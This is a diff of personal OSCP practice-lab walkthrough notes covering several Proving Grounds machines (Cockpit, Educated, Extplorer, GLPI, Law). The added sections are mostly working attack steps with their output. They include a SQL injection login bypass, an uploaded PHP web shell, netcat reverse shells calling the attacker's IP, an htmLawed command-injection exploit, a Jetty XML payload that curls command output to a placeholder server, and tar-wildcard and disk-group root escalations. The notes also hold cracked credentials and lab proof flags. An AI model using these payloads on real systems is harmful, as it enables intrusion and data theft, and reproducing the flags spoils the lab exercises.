@@ -604,7 +604,7 @@ remi:x:1000:1000::/home/remi:/bin/bash
 mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
 ```
 f. Access remi user ssh keys with this url. http://192.168.247.231/?cwd=../../../../../../../home/remi/.ssh
-g. Generate your own keys, upload .pub file after moving it to 'authorized_keys'
+g. Generate your own keys, upload .pub file after moving it to 'authorized_keys' Make sure to upload under .ssh folder and with 'authorized_keys' name
 h. Ssh login, get foothold and local.txt
 ```
 sudo ssh -i god remi@192.168.247.231 
@@ -628,13 +628,106 @@ remi@boolean:~/.ssh/keys$ ssh -i root root@127.0.0.1Received disconnect from 127
 Disconnected from 127.0.0.1 port 22
 ```
 
+4. Find out alias so using it. 
+```
+remi@boolean:~$ alias
+alias ls='ls --color=auto'
+alias root='ssh -l root -i ~/.ssh/keys/root 127.0.0.1'
+remi@boolean:~$ root
+Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@boolean:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@boolean:~# ls
+proof.txt
+root@boolean:~# cat proof.txt
+06d18d7f996c82ab2e919f4c6913b9ef
+
+
+# If there is not any issues use this commands
+ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true
+```
 ## Clue 
 
 
-
-
 ## Cockpit
+1. Rustscan 
+```
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack
+80/tcp   open  http       syn-ack
+9090/tcp open  zeus-admin syn-ack
+```
 
+2. Nmap 
+```
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
+|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
+|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
+80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: blaze
+9090/tcp open  ssl/zeus-admin?
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
+| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
+| Not valid before: 2024-03-17T01:21:26
+|_Not valid after:  2124-02-22T01:21:26
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 400 Bad request
+|     Content-Type: text/html; charset=utf8
+|     Transfer-Encoding: chunked
+```
+
+3. Found login page '/login.php' and performed sql injection. Obtained 2 base64 passwords. 
+```
+username - asd' union select 1,2,3,4,5 -- -
+password - null
+
+cameron - thisscanttbetouchedd@455152
+james - canttouchhhthiss@455152
+```
+
+4. Used james creds to login in port 9090. 
+
+5. Found terminal and local.txt
+```
+james@blaze:~$ cat local.txt
+efc23ac5a6ee7d760eea375838355970
+```
+
+6. Found wildcard for sudo -l. Performed privelege escalation. Obtained root.txt
+```
+james@blaze:~$ sudo -l
+(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
+
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/james/shell.sh  
+echo "" > "--checkpoint-action=exec=sh shell.sh"  
+echo "" > --checkpoint=1
+
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
+
+james@blaze:~$ /tmp/bash -p
+/tmp/bash -p
+id
+uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),1000(james)
+cd /root
+ls
+flag2.txt
+proof.txt
+snap
+cat proof.txt
+5936ab49d8705757c2dd3eee1f88e75c
+```
 
 
 
@@ -911,19 +1004,369 @@ ac5b54bec1545f1243c462061f35c236
 
 
 ## Educated
+1. Rustscan and nmap
+```
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+```
+
+2. Sub-directory bruteforce
+```
+python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.223.13/
+
+http://192.168.223.13/management/
+```
+
+3. Use burpsuite for uploading cmd file.  https://www.exploit-db.com/exploits/50587
+```
+POST /management/admin/examQuestion/create HTTP/1.1
+
+Host: 192.168.223.13
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: multipart/form-data; boundary=---------------------------183813756938980137172117669544
+
+Content-Length: 1331
+
+Connection: close
+
+Cache-Control: max-age=0
+
+Upgrade-Insecure-Requests: 1
 
 
 
+-----------------------------183813756938980137172117669544
+
+Content-Disposition: form-data; name="name"
+
+
+
+test4
+
+-----------------------------183813756938980137172117669544
+
+Content-Disposition: form-data; name="class_id"
+
+
+
+2
+
+-----------------------------183813756938980137172117669544
+
+Content-Disposition: form-data; name="subject_id"
+
+
+
+5
+
+-----------------------------183813756938980137172117669544
+
+Content-Disposition: form-data; name="timestamp"
+
+
+
+2021-12-08
+
+-----------------------------183813756938980137172117669544
+
+Content-Disposition: form-data; name="teacher_id"
+
+
+
+1
+
+-----------------------------183813756938980137172117669544
+
+Content-Disposition: form-data; name="file_type"
+
+
+
+txt
+
+-----------------------------183813756938980137172117669544
+
+Content-Disposition: form-data; name="status"
+
+
+
+1
+
+-----------------------------183813756938980137172117669544
+
+Content-Disposition: form-data; name="description"
+
+
+
+123123
+
+-----------------------------183813756938980137172117669544
+
+Content-Disposition: form-data; name="_wysihtml5_mode"
+
+
+
+1
+
+-----------------------------183813756938980137172117669544
+
+Content-Disposition: form-data; name="file_name"; filename="cmd.php"
+
+Content-Type: application/octet-stream
+
+
+
+<?php system($_GET["cmd"]); ?>
+
+-----------------------------183813756938980137172117669544--
+```
+
+4. Obtained reverse shell. 
+```
+http://192.168.223.13/management/uploads/exam_question/cmd.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20192.168.45.153%204445%20%3E%2Ftmp%2Ff
+
+nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [192.168.45.153] from (UNKNOWN) [192.168.223.13] 46218
+bash: cannot set terminal process group (1057): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@school:/var/www/html/management/uploads/exam_question$
+```
+
+5. Found mysql creds and from there found another creds. 
+```
+www-data@school:/var/www/html/management/application/config$ cat database.php
+
+'username' => 'school',
+'password' => '@jCma4s8ZM<?kA',
+
+www-data@school:/var/www/html/management/application/config$ mysql -u school -p
+<l/management/application/config$ mysql -u school -p         
+Enter password: @jCma4s8ZM<?kA
+use school_mgment;
+select * from teacher;
+use teacher;
+
+msander:3db12170ff3e811db10a76eadd9e9986e3c1a5b7
+```
+
+6. Ssh login and transfer grade-app.apk to local host. 
+```
+ssh msander@192.168.223.13
+
+msander@school:/home/emiller/development$ scp grade-app.apk kali@192.168.45.153:/home/kali/OSCP/pg/
+
+```
+
+7. Open it using jadx and find anther creds. 
+```
+jadx-gui grade-app.apk 
+
+ `emiller:EzPwz2022_dev1$$23!!`
+```
+
+8. Rooted and root.txt
+```
+emiller@school:~/development$ sudo bash
+root@school:/home/emiller/development#
+```
 
 ## Extplorer
+1. Rustscan
+```
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+```
 
+2. Bruteforce sub-directory
+```
+python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.245.13/
+
+[23:57:32] 200 -    2KB - /filemanager/   
+```
+
+3. Login with admin:admin credentials at filemanager. Successful. 
+
+4. Upload reverse shell, monkey pentest, in /wp-inclues/assets/
+
+5. Obtained reverse shell. 
+```
+nc -nvlp 4449      
+listening on [any] 4449 ...
+connect to [192.168.45.174] from (UNKNOWN) [192.168.245.16] 52108
+Linux dora 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 04:01:41 up 12 min,  0 users,  load average: 0.00, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+6. Found user dora shadow file at /filemanager/config/.htusers.php. Crack it. 
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt dora.txt 
+
+doraemon         (?)  
+```
+
+7. Login as dora, found disk partition. Use it for privilege escalation. Obtained local.txt. 
+https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989--------------------------------
+```
+id
+uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
+
+debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+
+debugfs:  cd /root
+```
+
+8. Get root shadow and crack it. 
+```
+cat /etc/shadow
+
+john --wordlist=/usr/share/wordlists/rockyou.txt root.txt
+
+explorer         (?)  
+```
+
+9. Login as root and obtained root.txt
+```
+cat proof.txt
+f518e2b6102c751dea4208ac8171a224
+```
 
 
 
 ## GLPI
-1. Tried, this machine was very hard although it was rated easy. 
-2. Most likely it need to be with 25 points. Although completed half with walkthrough 
-https://medium.com/@ardian.danny/oscp-practice-series-17-proving-grounds-glpi-555ce2d9234e 
+1. Rustscan and nmap 
+```
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+nmap -A -T4 -p80,22 192.168.223.242
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-22 20:23 EDT
+Nmap scan report for 192.168.223.242
+Host is up (0.26s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
+|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
+|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Authentication - GLPI
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds
+```
+
+2. Capture traffic with burpsuite and get reverse shell by making changes (only port 80 works for reverse shell)
+```
+POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
+
+sid=nnq477d8gl6r20k6tlo28gvjc0&text=call_user_func&hhook=array_map&hexec=passthru&spec[0]=&spec[1]=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+192.168.45.153+80+>/tmp/fcd 
+
+sudo nc -lvnp 80
+listening on [any] 80 ...
+connect to [192.168.45.153] from (UNKNOWN) [192.168.223.242] 55970
+sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+3. Mysql running for find password for user or add new password. 
+```
+www-data@glpi:/var/www/glpi/config$ cat config_db.php
+cat config_db.php
+<?php
+class DB extends DBmysql {
+   public $dbhost = 'localhost';
+   public $dbuser = 'glpi';
+   public $dbpassword = 'glpi_db_password';
+   public $dbdefault = 'glpi';
+   public $use_utf8mb4 = true;
+   public $allow_myisam = false;
+   public $allow_datetime = false;
+   public $allow_signed_keys = false;
+}
+
+www-data@glpi:/var/www/glpi/config$ mysql -u glpi -p
+mysql -u glpi -p
+Enter password: glpi_db_password
+
+show databases;
+use glpi;
+show tables;
+select * from glpi_users;
+select name, password from glpi_users where name = 'betty';
+update glpi_users SET password = '$2y$10$Kq6wuIrbcED3xBHQSTp2W.845KRt5vDRrcka9cDufnDF1EKpsQ/PO' where name = 'betty';
+(password = bebek)
+```
+
+4. Logged in GLPI portal and get betty ssh password
+```
+Hello Betty,
+
+i changed your password to : SnowboardSkateboardRoller234
+
+Please change it again as soon as you can.
+
+regards.
+
+Lucas
+```
+
+5. ssh login and find out 8080 internal port listener. Port forward and figure out jetty server running
+```
+   LISTEN 0      50            0.0.0.0:8080         0.0.0.0:*  
+   
+ssh -L 1234:localhost:8080 betty@192.168.223.242
+
+http://127.0.0.1:1234/
+icon Powered by Eclipse Jetty:// Server
+```
+
+6. Privilege escalation using jetty server. https://github.com/Mike-n1/tips/blob/main/JettyShell.xml?source=post_page-----555ce2d9234e--------------------------------
+```
+betty@glpi:/tmp$ chmod 777 root.sh
+betty@glpi:/tmp$ bash -p
+
+betty@glpi:/opt/jetty/jetty-base/webapps$ cat rooted.xml 
+<?xml version="1.0"?>
+<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
+<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
+    <Call class="java.lang.Runtime" name="getRuntime">
+        <Call name="exec">
+            <Arg>
+                <Array type="String">
+                    <Item>/bin/sh</Item>
+                    <Item>-c</Item>
+                    <Item>curl -F "r=`id`" http://yourServer:1337/</Item>
+                </Array>
+            </Arg>
+        </Call>
+    </Call>
+</Configure>
+
+betty@glpi:/opt/jetty/jetty-base/webapps$ bash -p
+bash-5.0# id
+uid=1000(betty) gid=1000(betty) euid=0(root) egid=0(root) groups=0(root),1000(betty)
+bash-5.0# whoami
+root
+bash-5.0# cd /root
+bash-5.0# ls
+proof.txt  snap
+bash-5.0# cat proof.txt
+88bc3fc1b60c15ea81b38423542ba404
+```
 
 
 ## Hub
@@ -1074,13 +1517,91 @@ cat local.txt
 
 ## Law
 
-1. Getting foothold did not work out. Id command worked at first, but not again. 
-```
-Useful links 
+Exploit = https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/?source=post_page-----bc9d7f7b2941--------------------------------
 
-https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/?source=post_page-----bc9d7f7b2941--------------------------------
+
+1. Rustscan and Nmap 
+```
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
+|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
+|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+|_http-title: htmLawed (1.2.5) test
+|_http-server-header: Apache/2.4.56 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at map.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.21 seconds
 ```
 
+2. Run exploit 
+a. Checking out
+```
+curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://192.168.223.190 |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+
+```
+
+b. Obtained reverse shell and local.txt
+```
+ curl -s -d 'sid=foo&hhook=exec&text=nc 192.168.45.153 4449 -e /bin/sh' -b 'sid=foo' http://192.168.223.190 |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
+
+sudo nc -lvnp 4449
+listening on [any] 4449 ...
+connect to [192.168.45.153] from (UNKNOWN) [192.168.223.190] 54556
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@law:/var/www$ cat local.txt
+cat local.txt
+a0d3e37471af4d53ec673d73d60ab000
+```
+
+3. Privilege escalation and root.txt
+```
+www-data@law:/var/www$ echo "chmod u+s /bin/bash" >> cleanup.sh
+
+www-data@law:/var/www$ /bin/bash -p 
+/bin/bash -p 
+bash-5.1# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data
+
+bash-5.1# cat proof.txt
+cat proof.txt
+cd41d64f03d2749cb1a99b4af2826ac7
+```
 
 ## Marshalled
 
@@ -1431,4 +1952,4 @@ cat proof.txt
 
 
 
-## BBSCute 
+
